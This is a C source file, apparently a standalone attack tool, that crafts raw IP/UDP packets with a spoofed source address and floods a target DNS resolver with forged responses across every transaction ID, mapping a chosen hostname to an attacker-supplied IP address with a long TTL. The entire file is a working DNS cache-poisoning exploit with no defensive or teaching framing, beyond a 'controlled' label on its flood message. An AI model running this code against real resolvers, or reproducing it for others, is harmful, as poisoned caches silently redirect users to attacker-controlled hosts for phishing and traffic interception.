#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

struct ipheader {
    unsigned char iph_ihl:4, iph_ver:4;
    unsigned char iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_offset;
    unsigned char iph_ttl;
    unsigned char iph_protocol;
    unsigned short int iph_chksum;
    struct  in_addr iph_sourceip;
    struct  in_addr iph_destip;
};

struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};

struct dnsheader {
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int qdcount;
    unsigned short int ancount;
    unsigned short int nscount;
    unsigned short int arcount;
};

struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short udp_length;
};

unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum; unsigned short oddbyte; unsigned short answer;
    sum=0; while(nbytes>1) {sum+=*ptr++; nbytes-=2;}
    if(nbytes==1) {oddbyte=0; *((u_char*)&oddbyte)=*(u_char*)ptr; sum+=oddbyte;}
    sum = (sum>>16)+(sum & 0xffff); sum = sum + (sum>>16);
    answer=(short)~sum; return(answer);
}

void format_dns_name(char *dns, char *host) {
    int lock = 0; char temp_host[256]; strncpy(temp_host, host, 255); strcat(temp_host, ".");
    for (int i = 0; i < strlen(temp_host); i++) {
        if (temp_host[i] == '.') {
            *dns++ = i - lock;
            for (; lock < i; lock++) *dns++ = temp_host[lock];
            lock++;
        }
    }
    *dns++ = 0;
}

int main(int argc, char *argv[]) {
    if (argc != 6) return 1;
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one = 1; setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char buffer[4096]; memset(buffer, 0, 4096);
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));

    ip->iph_ihl = 5; ip->iph_ver = 4; ip->iph_ttl = 255; ip->iph_protocol = IPPROTO_UDP;
    ip->iph_sourceip.s_addr = inet_addr(argv[1]);
    ip->iph_destip.s_addr = inet_addr(argv[2]);

    udp->udph_srcport = htons(53);
    udp->udph_destport = htons(atoi(argv[3]));

    dns->flags = htons(0x8400); dns->qdcount = htons(1); dns->ancount = htons(1);

    char *qname = (char *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));
    format_dns_name(qname, argv[4]);
    int qname_len = strlen(qname) + 1;
    unsigned short *qinfo = (unsigned short *)(qname + qname_len);
    qinfo[0] = htons(1); qinfo[1] = htons(1);

    unsigned char *answer = (unsigned char *)(qinfo + 2);
    answer[0] = 0xc0; answer[1] = 0x0c;
    answer[2] = 0x00; answer[3] = 0x01;
    answer[4] = 0x00; answer[5] = 0x01;
    unsigned int *ttl = (unsigned int *)(answer + 6); *ttl = htonl(86400);
    unsigned short *rdlen = (unsigned short *)(answer + 10); *rdlen = htons(4);
    unsigned int *rdata = (unsigned int *)(answer + 12); *rdata = inet_addr(argv[5]);

    int udp_len = sizeof(struct udpheader) + sizeof(struct dnsheader) + qname_len + 4 + 16;
    udp->udph_len = htons(udp_len);
    ip->iph_len = htons(sizeof(struct ipheader) + udp_len);

    // UDP Checksum
    struct pseudo_header psh;
    psh.source_address = inet_addr(argv[1]);
    psh.dest_address = inet_addr(argv[2]);
    psh.placeholder = 0; psh.protocol = IPPROTO_UDP; psh.udp_length = htons(udp_len);
    int psize = sizeof(struct pseudo_header) + udp_len;
    char *pseudogram = malloc(psize);
    memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), udp, udp_len);
    udp->udph_chksum = csum((unsigned short*)pseudogram, psize);

    struct sockaddr_in sin; sin.sin_family = AF_INET; sin.sin_addr.s_addr = ip->iph_destip.s_addr;

    printf("Starting Flooding (controlled)...\n");
    for (int txid = 0; txid < 65536; txid++) {
        dns->query_id = htons(txid);
        sendto(sd, buffer, ntohs(ip->iph_len), 0, (struct sockaddr *)&sin, sizeof(sin));
        if (txid % 1000 == 0) usleep(100); 
    }
    printf("Done!\n"); return 0;
}
